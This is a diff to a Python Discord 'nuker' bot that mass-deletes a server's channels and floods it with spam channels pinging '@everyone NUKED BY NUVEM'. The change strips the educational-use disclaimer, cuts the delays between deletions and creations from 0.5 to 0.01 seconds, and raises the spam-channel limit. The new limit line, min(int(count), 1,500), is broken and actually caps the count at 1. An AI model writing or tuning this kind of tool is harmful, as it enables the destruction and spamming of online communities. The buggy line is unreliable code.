@@ -27,12 +27,8 @@ class NUVEMNuker:
 ██║ ╚████║ ╚████╔╝ ╚██████╔╝███████╗██║ ╚═╝ ██║
 ╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚══════╝╚═╝     ╚═╝
 {Style.RESET_ALL}
-{Fore.CYAN}>>> Powerful Server Management Tool <<<{Style.RESET_ALL}
+{Fore.CYAN}>>> Author: stanmapagmahal <<<{Style.RESET_ALL}
 """
-
-    def print_banner(self):
-        print(self.BANNER)
-        print(f"{Fore.YELLOW}Disclaimer: This tool is for educational purposes only.{Style.RESET_ALL}\n")
 
     async def check_requirements(self):
         missing = []
@@ -131,14 +127,14 @@ class NUVEMNuker:
                 try:
                     await channel.delete()
                     print(f"{Fore.RED}Deleted: {channel.name}{Style.RESET_ALL}")
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.01)
                 except Exception as e:
                     print(f"{Fore.RED}Error deleting {channel.name}: {e}{Style.RESET_ALL}")
         
         async def create_spam_channels(guild):
-            count = input(f"{Fore.YELLOW}How many spam channels? (1-50): {Style.RESET_ALL}")
+            count = input(f"{Fore.YELLOW}How many spam channels? (1,500): {Style.RESET_ALL}")
             try:
-                count = min(int(count), 50)
+                count = min(int(count), 1,500)
             except ValueError:
                 print(f"{Fore.RED}Invalid number!{Style.RESET_ALL}")
                 return
@@ -150,7 +146,7 @@ class NUVEMNuker:
                     channel = await guild.create_text_channel(f"nuked-{name}")
                     await channel.send("@everyone NUKED BY NUVEM")
                     print(f"{Fore.GREEN}Created: {channel.name}{Style.RESET_ALL}")
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.01)
                 except Exception as e:
                     print(f"{Fore.RED}Error creating channel: {e}{Style.RESET_ALL}")
         
